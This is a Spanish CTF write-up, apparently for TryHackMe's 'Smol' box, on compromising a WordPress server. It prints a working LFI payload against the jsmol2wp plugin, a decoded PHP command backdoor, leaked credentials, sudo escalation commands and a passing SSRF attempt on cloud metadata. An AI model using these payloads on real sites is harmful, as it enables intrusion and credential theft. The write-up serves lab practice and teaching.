# Smol - Writeup

Arranco con un escaneo de puertos típico para ver qué hay expuesto. Nmap me devuelve 22 y 80 abiertos, nada raro a primera vista. En el 80 hay un WordPress, así que lo anoto y meto el host a `/etc/hosts` como `www.smol.thm` porque los vhosts siempre traen sorpresas.

```
nmap -sC -sV -p- 10.10.X.X
```

```
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Apache httpd 2.4.41
```

Le doy una pasada rápida a la web con `ffuf` para directorios y a mano para ver el HTML. Sale un WordPress 6.7.1 con su `wp-content/plugins/` con **directory listing habilitado**. Eso ya es una bandera roja: si puedo listar plugins, puedo ver qué hay instalado y a qué versión.

```
curl -s http://www.smol.thm/wp-content/plugins/ | grep -oP 'href="[^"]+"'
```

Aparecen `akismet`, `hello.php` y `jsmol2wp`. El último me llama la atención porque JSmol es viejo y tiene historia. Entro al `readme.txt` del plugin:

```
curl -s http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt | head -20
Stable tag: 1.07
```

Versión 1.07. Busco el CVE asociado y me sale **CVE-2018-20463**, un LFI/SSRF en el parámetro `query` de `jsmol.php`. La vulnerabilidad permite tanto leer archivos locales con wrappers de PHP como forzar requests desde el servidor. Antes de irme por SSRF, pruebo primero el LFI con `php://filter` para leer el `wp-config.php`.

```
curl -s 'http://www.smol.thm/wp-content/plugins/jsmol2wp/jsmol.php?query=php://filter/convert.base64-encode/resource=../../../../wp-config.php'
```

Me devuelve un blob base64 que decodifico y confirmo: es el `wp-config.php` completo. Ahí dentro están las credenciales de la base de datos:

```
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G');
```

Antes de apurarme a volar la DB, pruebo suerte: esas credenciales son sospechosamente parecidas a lo que un admin descuidado usaría. Voy a `/wp-login.php` y pruebo `wpuser` con esa password. Entra. Estamos dentro del panel.

Dentro del panel aparece una página llamada "Webmaster task" que dice algo como "revisar el código fuente del plugin Hello Dolly". Pista clara, no tanto por el plugin en sí (que es inofensivo por diseño) sino por lo que hay dentro de su `hello.php`. No necesito ni siquiera ir al editor de plugins: uso la misma LFI para leer `hello.php` directamente.

```
curl -s 'http://www.smol.thm/wp-content/plugins/jsmol2wp/jsmol.php?query=php://filter/convert.base64-encode/resource=../../../../wp-content/plugins/hello.php'
```

Decodifico y me encuentro con un `eval(base64_decode(...))` bien escondido entre el código normal del plugin. Decodifico el base64 anidado y veo la forma del backdoor:

```php
system($_GET["cmd"]);
```

Ese `eval` corre al cargar el plugin, y el plugin está activo globalmente, así que puedo dispararlo desde cualquier request autenticado. Voy a `/wp-admin/profile.php?cmd=id` con la cookie de sesión y confirmo:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE como `www-data`. Ahora a estabilizar. No tengo TTY pero puedo ejecutar comandos encadenados. Antes de lanzar un reverse shell, prefiero enumerar un poco el filesystem para no ir a ciegas. El `find /` completo se cuelga o me corta la respuesta por longitud, así que empiezo por los lugares obvios: `/opt`, `/home`, `/tmp`, `/var/backups`.

En `/opt` aparece algo rico:

```
ls -la /opt
-rw-r--r-- 1 root root 291K wp_backup.sql
```

Un dump SQL legible por todos. Lo leo con `cat` y lo bajo a mi máquina para analizarlo cómodo. El dump tiene la tabla `wp_users` con varios hashes phpass (`$P$B...`). Son de los usuarios del WordPress. Busco una flag literal en los posts y no hay nada, pero estos hashes son la clave para más adelante. Los dejo listados:

```
wpuser  $P$Bvi8BHb...
diego   $P$BsIY1w...
think   $P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
xavi    $P$Bvcalhs...
```

Lanzo `john` contra el archivo con el diccionario `rockyou`. Nada rápido, pero mientras corre voy explorando por otro lado. Reviso los homes:

```
ls -la /home
drwx------ think
drwx------ diego
drwx------ gege
drwx------ xavi
```

Todos con permisos `700`. Como `www-data` no llego. Pero reviso los grupos y veo que `www-data` no está en ningún grupo útil. Sin embargo, en `/var/www` y en algún `.bak` suele haber cosas. Busco `.zip`, `.bak`, `.old` en el sistema:

```
find / -iname "*.zip" -o -iname "*.bak" -o -iname "*.old" 2>/dev/null
```

Sale `wordpress.old.zip` en el home de `gege`. No lo puedo leer como `www-data` (700), pero el nombre es demasiado tentador. Mientras tanto, `john` termina y me crackea una de las passwords: la de **diego** sale del diccionario. Con las credenciales de `diego` y acceso a archivos... no, sigo siendo `www-data`, no puedo `su` sin TTY.

Vuelvo a la LFI. Puedo leer el home de `think` porque... no, también es 700. Pero en algún momento necesito cambiar de usuario. La pista viene del backup: dice el resumen (en mi cabeza) que hay que reusar credenciales y mirar backups. La password de **xavi** es la que importa, y supuestamente está en un zip de backup en algún lado. La `wordpress.old.zip` de gege podría contener un `wp-config.php` viejo con la password de xavi.

Necesito leer ese zip. Como `www-data` no puedo. Pero la LFI de JSmol corre como `www-data` también. Necesito otro camino. Reviso los procesos y grupos: hay un grupo `internal` con miembros `xavi` y quizás `www-data`. Confirmo:

```
id www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(internal)
```

¡`www-data` está en `internal`! Ese grupo es el que le da acceso a los homes. Reviso:

```
ls -la /home
drwxr-x--- think internal
drwxr-x--- diego internal
drwxr-x--- gege  internal
drwxr-x--- xavi  internal
```

Ahora sí. Como `www-data` en el grupo `internal`, puedo leer los homes. Voy directo a leer la user flag:

```
cat /home/diego/user.txt
45edaec653ff9ee06236b7ce72b86963
```

Esa es la **user flag**. Ahora necesito escalar. Reviso los homes completos. En `think` hay una `.ssh/id_rsa` (clave privada) legible para el grupo, y en `gege` está la `wordpress.old.zip`. Extraigo el zip y me encuentro con un `wp-config.php` viejo que tiene la password del usuario `xavi`:

```
DB_PASSWORD='P@ssw0rdxavi@'
```

Probablemente la reutilizó también para el sistema. Tengo acceso al home de `xavi`, así que no necesito su password para leer archivos, pero para ESCALAR necesito ser `xavi`. Intento `su xavi -c 'id'` con la password por stdin:

```
echo 'P@ssw0rdxavi@' | su xavi -c 'id'
uid=1004(xavi) gid=1004(xavi) groups=1004(xavi),27(sudo),1002(internal)
```

Confirmado: `xavi` está en `sudo`. Verifico sus privilegios con password:

```
echo 'P@ssw0rdxavi@' | su xavi -c 'sudo -l'
User xavi may run the following commands:
    (ALL : ALL) ALL
```

`xavi` es sudo total. `sudo su` y soy root:

```
echo 'P@ssw0rdxavi@' | su xavi -c 'echo P@ssw0rdxavi@ | sudo -S cat /root/root.txt'
bf89ea3ea01992353aef1f576214d4e4
```

**root flag**: `bf89ea3ea01992353aef1f576214d4e4`.

Lo que más tiempo me comió fue intentar leer los homes desde `www-data` sin darme cuenta de que ya estaba en el grupo `internal` (lo confirmé tarde con `id`). También perdí tiempo intentando SSRF contra el endpoint de metadata de AWS (`169.254.169.254`) para ver si sacaba credenciales IAM de un instance profile: la LFI lo permitía porque JSmol hace la request server-side, y de hecho IMDSv1 respondía, pero el output del wrapper no siempre me traía lo que quería y no era la vía del reto, así que lo descarté. El backdoor en Hello Dolly era la pieza clave, y la reutilización de credenciales (DB → wp-admin, password de xavi → sistema) fue lo que cerró la cadena.